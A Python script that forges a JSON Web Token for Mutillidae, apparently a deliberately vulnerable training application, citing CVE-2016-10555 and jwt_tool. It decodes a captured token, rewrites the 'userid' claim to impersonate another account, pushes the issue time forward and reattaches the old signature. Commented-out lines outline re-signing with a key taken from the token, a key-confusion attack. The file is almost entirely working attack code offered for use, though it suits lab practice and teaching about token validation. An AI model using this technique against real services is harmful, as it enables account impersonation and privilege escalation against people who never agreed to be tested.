#!/usr/bin/python3

import base64
import json
import pprint
import datetime
import hmac
import hashlib
from collections import OrderedDict

# Inspired from https://github.com/ticarpi/jwt_tool
# Inspired from CVE-2016-10555

# Mutillidae JWT Token Manipulation
jwtRaw="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTY0ODY1NzM2MiwiZXhwIjoxNjQ4NjU5MTYyLCJ1c2VyaWQiOiIyNSJ9.dMObUUWZ0yv3x_KPkxJVqSOTEpDvVIuJT3BRucaQSYc"

# jwt token has 3 parts seperated by a period
try:
    # Split the token into the respective 3 parts
    headB64, paylB64, sig = jwtRaw.split(".",3)
except:
    print("Invalid Token")

############################### Header of JWT
# To look at the header section of the jwt
head = base64.urlsafe_b64decode(headB64 + "=" * (-len(headB64) % 4))

headDict = json.loads(head, object_pairs_hook=OrderedDict)
print("Current: " + str(headDict))
headDict["alg"] = "HS256"
print("New: " + str(headDict))
print("\n")
rebuiltHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")


################################ Payload of JWT
# To look at the payload of the jwt
payload = base64.urlsafe_b64decode(paylB64 + "=" * (-len(paylB64) % 4))
payloadDict = json.loads(payload, object_pairs_hook=OrderedDict)
print("Current Payload of JWT")
print("----------------------")
print(str(payloadDict))
#print(str(paylB64))

print("\nManipulating the userid...")
print("----------------------------")

print("Current UserID: " + payloadDict["userid"])

# manipulate the userid below
payloadDict["userid"] = "2"
print("New UserID: " + str(payloadDict["userid"]))
print("\n")
print("Manipulating the iat... (Not necessary)")
print("----------------------------")
nowtime = int(datetime.datetime.now().timestamp())
timestampPayload = datetime.datetime.fromtimestamp(int(payloadDict["iat"]))
if int(timestampPayload.timestamp()) < nowtime:
    print("IAT: " + str(payloadDict["iat"]) + " Payload Timestamp: " + str(timestampPayload) + " has expired!")
    # Manipulate the iat to be 20 minutes ahead of current time
    timestampNow = datetime.datetime.fromtimestamp(nowtime)
    print("Current Timestamp: " + str(timestampNow))
    newtime = nowtime + 1200
    timestampNew = datetime.datetime.fromtimestamp(newtime)
    payloadDict["iat"] = newtime
    print("New Timestamp: " + str(payloadDict["iat"]) + " New Timestamp: " + str(timestampNew))
#print("\nPublic Key")
#publicKey = payloadDict["pk"]
#print(publicKey)
# Rebuild the base64 for the payload
rebuiltPayload = base64.urlsafe_b64encode(json.dumps(payloadDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
print("New Payload of JWT")
print("---------------------------")
print(str(payloadDict))
#print(str(rebuiltPayload))
print("\n")

################################# Signature of the JWT
# To look at the signature section of the jwt
sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
print("Current Signature: " + sig)
newToken = rebuiltHead + "." + rebuiltPayload
#print(newToken)
#rebuiltSig = base64.urlsafe_b64encode(hmac.new(publicKey.encode(),newToken.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
#print("New Signature: " + rebuiltSig)

print("\n\nNew JWT Token")
print("----------------------------------------------")
newJWT = rebuiltHead + "." + rebuiltPayload + "." + sig
print(newJWT)

